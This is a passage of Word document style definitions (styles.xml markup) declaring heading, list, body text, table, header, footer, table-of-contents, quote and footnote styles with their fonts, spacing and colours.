  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading8">
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading8Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading9Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="3185BA"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MWR table"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:rsid w:val="00125592"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
    <w:tblPr>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bottom w:w="102" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="EBEDEE"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
        <w:b w:val="0"/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="CED2D5"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="Plaintable">
    <w:name w:val="Plain table"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:left w:w="0" w:type="dxa"/>
        <w:right w:w="0" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="1"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="34"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="2"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="3"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Heading1nonum">
    <w:name w:val="Heading 1 nonum"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="BodyText"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="2"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Lucida Sans Unicode" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="4"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:ind w:left="567" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet2">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="5"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="5"/>
      </w:numPr>
      <w:ind w:left="850" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet3">
    <w:name w:val="List Bullet 3"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="6"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
      <w:ind w:left="1134" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber">
    <w:name w:val="List Number"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="8"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:ind w:left="567" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber2">
    <w:name w:val="List Number 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Listalpha">
    <w:name w:val="List alpha"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="7"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
      <w:ind w:left="850" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Listroman">
    <w:name w:val="List roman"/>
    <w:basedOn w:val="BodyText"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
      <w:ind w:left="1134" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextChar"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="135"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextChar">
    <w:name w:val="Body Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyText"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="16"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:before="120" w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="BodyText"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00902F3F"/>
    <w:pPr>
      <w:spacing w:after="360"/>
      <w:ind w:right="28"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:caps/>
      <w:noProof/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cs="Arial"/>
      <w:caps/>
      <w:noProof/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="BodyText"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00902F3F"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:pos="8929"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:right="28"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="BodyText"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:semiHidden/>
    <w:rsid w:val="003C5514"/>
    <w:pPr>
      <w:spacing w:before="840" w:after="520" w:line="276" w:lineRule="auto"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:kern w:val="28"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="52"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:kern w:val="28"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="52"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="00D266ED"/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:after="520"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="34"/>
      <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="10206"/>
      </w:tabs>
      <w:spacing w:after="160"/>
      <w:ind w:right="281"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="10206"/>
      </w:tabs>
      <w:spacing w:after="160" w:line="320" w:lineRule="atLeast"/>
      <w:ind w:left="284" w:right="281"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="23"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="1320"/>
        <w:tab w:val="right" w:pos="8875"/>
      </w:tabs>
      <w:spacing w:after="100"/>
      <w:ind w:left="454" w:right="227"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:smallCaps/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseReference">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="32"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:spacing w:val="5"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="4" w:color="68727B" w:themeColor="accent1"/>
      </w:pBdr>
      <w:spacing w:before="200" w:after="280"/>
      <w:ind w:left="936" w:right="936"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="IntenseQuoteChar">
    <w:name w:val="Intense Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="IntenseQuote"/>
    <w:uiPriority w:val="30"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="Headings">
    <w:name w:val="Headings"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BalloonTextChar">
    <w:name w:val="Balloon Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BalloonText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="BodyText"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:semiHidden/>
    <w:rsid w:val="003C5514"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="1"/>
      </w:numPr>
      <w:spacing w:after="120" w:line="360" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:iCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SubtitleChar">
    <w:name w:val="Subtitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Subtitle"/>
    <w:uiPriority w:val="11"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:iCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AppendixHeading2">
    <w:name w:val="Appendix Heading 2"/>
    <w:next w:val="BodyText"/>
    <w:uiPriority w:val="14"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cs="Arial"/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AppendixHeading3">
    <w:name w:val="Appendix Heading 3"/>
    <w:uiPriority w:val="8"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS" w:cs="Arial"/>
      <w:b/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Heading2nonum">
    <w:name w:val="Heading 2 nonum"/>
    <w:basedOn w:val="Heading2"/>
    <w:next w:val="BodyText"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:pos="8863"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:noProof/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AppendixHeading1">
    <w:name w:val="Appendix Heading 1"/>
    <w:next w:val="BodyText"/>
    <w:uiPriority w:val="13"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:after="480"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cs="Arial"/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="34"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
